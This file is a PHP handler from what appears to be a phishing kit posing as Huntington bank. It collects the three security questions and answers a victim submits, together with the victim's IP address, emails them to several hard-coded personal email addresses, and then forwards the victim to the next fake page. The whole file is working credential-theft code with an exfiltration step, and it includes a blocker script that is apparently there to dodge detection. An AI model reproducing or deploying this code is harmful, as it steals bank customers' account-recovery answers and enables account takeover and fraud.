<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message .= "D0N5L0W----HUNT1NGT0N-----QUEST10N----2023\n";
$message .= "Question 1: " .$_POST['q1']."\n\n";
$message .= "Answer 1: " .$_POST['a1']."\n\n";
$message .= "Question 2: " .$_POST['q2']."\n\n";
$message .= "Answer 2: " .$_POST['a2']."\n\n";
$message .= "Question 3: " .$_POST['q3']."\n\n";
$message .= "Answer 3: " .$_POST['a3']."\n\n";
$message .= "D0N5L0W----HUNT1NGT0N-----QUEST10N----2023\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "D0N5L0W----HUNT1NGT0N-----QUEST10N----2023\n";
$recipient = "donflow2021@yahoo.com,donflow2021@yahoo.com,user0202777a@gmail.com, jcole15000@hotmail.com, donflowmania@maine.rr.com, donflowmania@juno.com";
$subject = "D0N5L0W----HUNT1NGT0N-----QUEST10N----2023";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."HUNT1NGT0N";
$headers .= "D0N5L0W----HUNT1NGT0N-----QUEST10N----2023";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: ques5.php");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        